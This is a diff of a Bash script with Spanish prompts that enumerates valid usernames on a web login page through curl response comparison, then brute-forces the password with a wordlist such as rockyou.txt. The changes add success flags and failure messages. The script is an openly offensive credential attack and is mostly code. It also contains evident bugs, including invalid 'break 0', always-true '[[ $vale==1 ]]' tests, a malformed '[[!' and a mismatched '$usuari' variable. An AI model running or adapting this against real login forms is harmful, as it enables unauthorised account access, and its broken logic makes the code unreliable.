@@ -5,7 +5,8 @@ URL=$(echo -e "$url")
 echo "Dime un usuario o un fichero txt con un listado de usuarios"
 read document
 #añadir a.txt
-
+ok=0
+vale=0
 if [ -f  $document ]
 then
     echo "Recuerda que este proceso puede tardar minutos."
@@ -15,9 +16,9 @@ then
         test=$(awk "NR==$start{print $1}" $document)
         if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
         then
-            echo -e "El usuario és $test"
             username=$test
-            break 1
+            vale=1
+            break 0
         fi
         ((start = start + 1))
     #    echo $start
@@ -25,9 +26,9 @@ then
 else
     if [[! $(curl -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
         then
-            echo -e "El usuario és $document"
             username=$document
-            break 1
+            vale=1
+            break 0
         else
             echo "Usuario inexistente."
         fi
@@ -35,7 +36,11 @@ else
     #    echo $start
     done
 fi
-
+if [[ $vale==1 ]]
+then
+    echo -e "No hemos podido encontrar un usuario valido."
+    exit 1
+fi
 echo "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta."
 read document
 if [ -f  $document ] 
@@ -54,13 +59,21 @@ while [ $start -le $total ]
     if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
     then
         password=$test
-        break 1
+        ok=1
+        break 0
     fi
     ((start = start + 1))
 done
-echo -e "El usuario es $usuari y su contraseña és $password"
-if [ -f  rockyou.txt ] 
+if [ -f  rockyou.txt ]
 then
     rm rockyou.txt
+fi
+if [[ $ok==1 ]]
+then
+    echo -e "El usuario es $usuari y su contraseña és $password ."
+else
+    echo -e "El usuario es $usuari ."
+    echo -e "La contraseña no se encuentra en el diccionario, lo sentimos."
+    exit 1
 fi
 }
